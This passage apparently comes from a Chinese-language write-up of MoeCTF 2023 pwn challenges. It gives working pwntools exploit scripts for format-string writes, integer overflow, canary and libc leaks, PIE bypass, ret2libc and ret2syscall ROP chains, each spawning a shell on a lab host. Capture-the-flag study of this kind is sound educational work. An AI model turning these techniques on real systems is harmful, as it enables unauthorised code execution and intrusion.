<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">a=<span class="number">0x63656f6d7a7b6674595848355758456e417879614e417647325f324e30497875325051547d30466e</span></span><br><span class="line">b=long_to_bytes(<span class="built_in">int</span>(a))</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(b),<span class="number">4</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(b[i+<span class="number">3</span>]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(b[i+<span class="number">2</span>]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(b[i + <span class="number">1</span>]), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(b[i]), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="format-level1"><a href="#format-level1" class="headerlink" title="format_level1"></a>format_level1</h1><p>偏移为7</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input what you want to talk: </span><br><span class="line"><span class="meta prompt_">aaaa_%</span><span class="language-bash">7<span class="variable">$p</span></span></span><br><span class="line">You said: </span><br><span class="line">aaaa_0x61616161</span><br><span class="line">But the dragon seems to ignore you.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>通过任意地址修改把龙的血量改为0；</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;-sh&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;192.168.23.1&#x27;</span>,<span class="number">49719</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwner=elf.sym[<span class="string">&#x27;pwner&#x27;</span>]</span><br><span class="line">dragon=elf.sym[<span class="string">&#x27;dragon&#x27;</span>]</span><br><span class="line">payload=fmtstr_payload(<span class="number">7</span>,&#123;dragon:<span class="number">0</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;choice:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;talk:&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;choice:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> n; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to Moectf2023.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know int overflow?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can you make n == -114514 but no &#x27;-&#x27; when you input n.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input n:&quot;</span>);</span><br><span class="line">  get_input(&amp;n);</span><br><span class="line">  <span class="keyword">if</span> ( n == <span class="number">-114514</span> )</span><br><span class="line">    backdoor();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Maybe you should search and learn it.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>是一个整数溢出.</p>
<p>11514的二进制原码是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000 0000 0000 0001 1011 1111 0101 0010</span><br></pre></td></tr></table></figure>

<p>所以-114514的二进制源码是最高位补1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1000 0000 0000 0001 1011 1111 0101 0010</span><br></pre></td></tr></table></figure>

<p>-114514的反码为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1111 1111 1111 1110 0100 0000 1010 1101</span><br></pre></td></tr></table></figure>

<p>-114514的补码为反码加1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1111 1111 1111 1110 0100 0000 1010 1110</span><br></pre></td></tr></table></figure>

<p>在计算机中就是把n和这串二进制数进行比较，这串二进制数还可以表示为4294852782，所以输入4294852782就能绕过if条件。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;-sh&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;192.168.23.1&#x27;</span>,<span class="number">65186</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please input n:\n&#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(<span class="number">4294852782</span>))</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="little-canary"><a href="#little-canary" class="headerlink" title="little_canary"></a>little_canary</h1><p>canary，libc</p>
<p>首先通过printf泄露canary，然后再泄露libc，泄露canary的时候通过gdb动调</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;192.168.23.1&#x27;</span>,<span class="number">57683</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=elf.libc</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi=<span class="number">0x0401343</span></span><br><span class="line">ret=<span class="number">0x040101a</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">68</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name?&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()r</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">a=p.recv()</span><br><span class="line">b=p.recv()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">	<span class="keyword">if</span> b[i]==<span class="number">0x0a</span>:</span><br><span class="line">		canary=b[i+<span class="number">1</span>:i+<span class="number">8</span>]</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">canary=u64(canary.rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;a:&#x27;</span>,a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;b:&#x27;</span>,b)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary:&#x27;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="comment">#print(&#x27;c:&#x27;,c)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">68</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span>+p64(canary)+<span class="string">b&#x27;cccccccc&#x27;</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line"><span class="comment">#c=p.recv()</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">a=p.recv()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">	<span class="keyword">if</span> a[i]==<span class="number">0x74</span> <span class="keyword">and</span> a[i+<span class="number">1</span>]==<span class="number">0x21</span>:</span><br><span class="line">		puts_addr=u64(a[i+<span class="number">2</span>:i+<span class="number">8</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"><span class="comment">#a=p.recv()</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;a:&#x27;</span>,a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr:&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">68</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span>+p64(canary)+<span class="string">b&#x27;cccccccc&#x27;</span>+p64(pop_rdi)+p64(bin_sh)+p64(ret)+p64(system_addr)</span><br><span class="line"><span class="comment">#p.recvuntil(&#x27;name?&#x27;)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>本道题目远程环境为<code>libc6_2.31-0ubuntu9.9_amd64</code></p>
<h1 id="PIE-enabled"><a href="#PIE-enabled" class="headerlink" title="PIE_enabled"></a>PIE_enabled</h1><p>开启了PIE保护，但是程序会给我们输出当前运行的vuln的实际地址。可以算出当前程序运行的基地址。继而算出system_plt地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;-sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;192.168.23.1&#x27;</span>,<span class="number">49746</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> elf.sym:</span><br><span class="line">	<span class="built_in">print</span>(i)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(elf.sym[<span class="string">&#x27;vuln&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">vuln=p.recv()[-<span class="number">15</span>:-<span class="number">1</span>:<span class="number">1</span>].decode()</span><br><span class="line">vuln=<span class="built_in">hex</span>(<span class="built_in">int</span>(vuln,<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(vuln)</span><br><span class="line"></span><br><span class="line">base_addr=<span class="built_in">int</span>(vuln,<span class="number">16</span>)-elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line">system_addr=base_addr+elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=<span class="number">0x4010</span></span><br><span class="line">bin_sh_addr=bin_sh+base_addr</span><br><span class="line">pop_rdi=<span class="number">0x1323</span>+base_addr</span><br><span class="line">ret=<span class="number">0x101a</span>+base_addr</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(bin_sh_addr)+p64(ret)+p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="rePWNse"><a href="#rePWNse" class="headerlink" title="rePWNse"></a>rePWNse</h1><p>a4 * a2 &#x3D;&#x3D; 10 * a5 + a6</p>
<p>a6 &#x3D;&#x3D; a7 + 1</p>
<p>a2&#x3D;&#x3D;9</p>
<p>a2 &#x3D;&#x3D; a4</p>
<p>a7&#x3D;&#x3D;0</p>
<p>a0 &#x3D;&#x3D; a3</p>
<p>a4 - a5 &#x3D;&#x3D; a0</p>
<p>解出上述方程就可以得到&#x2F;bin&#x2F;sh的地址。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;192.168.23.1&#x27;</span>,<span class="number">54141</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">execve_addr=elf.plt[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line">action_addr=elf.sym[<span class="string">&#x27;action&#x27;</span>]</span><br><span class="line">pop_rdi=<span class="number">0x040168e</span></span><br><span class="line">ret_addr=<span class="number">0x040101a</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> elf.sym:</span><br><span class="line">	<span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="built_in">str</span>(<span class="number">1</span>)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(<span class="number">9</span>)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(<span class="number">1</span>)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(<span class="number">9</span>)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(<span class="number">8</span>)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(<span class="number">1</span>)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;digits:&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">a=p.recv()</span><br><span class="line">b=p.recv()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">	<span class="keyword">if</span> b[i]==<span class="number">0x30</span> <span class="keyword">and</span> b[i+<span class="number">1</span>]==<span class="number">0x78</span>:</span><br><span class="line">		bin_sh=<span class="built_in">int</span>(b[i:i+<span class="number">9</span>],<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;a:&#x27;</span>,a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;b:&#x27;</span>,b)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;bin_sh:&#x27;</span>,<span class="built_in">hex</span>(bin_sh))</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(pop_rdi)+p64(bin_sh)+p64(action_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ssize_t vuln()</span><br><span class="line">&#123;</span><br><span class="line">  char buf[<span class="number">80</span>]; // [rsp+0h] [rbp-50h] BYREF</span><br><span class="line"></span><br><span class="line">  puts(<span class="string">&quot;I hide the b4ckdoor..\n&quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot;But..maybe libc can help u??\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, 0x100uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一个简单的libc，先泄露其中一个函数的真实地址，算出libc基地址，然后构造ropper链。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;-sh&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;192.168.23.1&#x27;</span>,<span class="number">54729</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=elf.libc</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> elf.sym:</span><br><span class="line">	<span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x040117e</span></span><br><span class="line">ret=<span class="number">0x040101a</span></span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;u??&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">a=p.recv()</span><br><span class="line">puts_addr=u64(p.recv()[<span class="number">0</span>:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#print(&#x27;a:&#x27;,a)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr:&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base=puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(bin_sh)+p64(ret)+p64(system_addr)</span><br><span class="line"><span class="comment">#payload=b&#x27;a&#x27;*0x58+p64(pop_rdi)+p64(bin_sh)+p64(system_addr)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p>通过改变寄存器调用shell，binsh地址可在ida查看</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">rax=59</span></span><br><span class="line"><span class="string">rdx=0</span></span><br><span class="line"><span class="string">rsi=0</span></span><br><span class="line"><span class="string">rdi=binsh</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;deepin-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rax=<span class="number">0x040117e</span></span><br><span class="line"></span><br><span class="line">pop_rsi_rdx=<span class="number">0x0401182</span></span><br><span class="line">pop_rdi=<span class="number">0x0401180</span></span><br><span class="line">bin_sh=<span class="number">0x0404040</span></span><br><span class="line">syscall=<span class="number">0x0401185</span></span><br><span class="line">syscall2=<span class="number">0x0401185</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">72</span>+p64(pop_rax)+p64(<span class="number">59</span>)+p64(pop_rsi_rdx)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(bin_sh)+p64(syscall2)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="ret2text-32"><a href="#ret2text-32" class="headerlink" title="ret2text_32"></a>ret2text_32</h1><p>32位溢出，有system，有字符串</p>
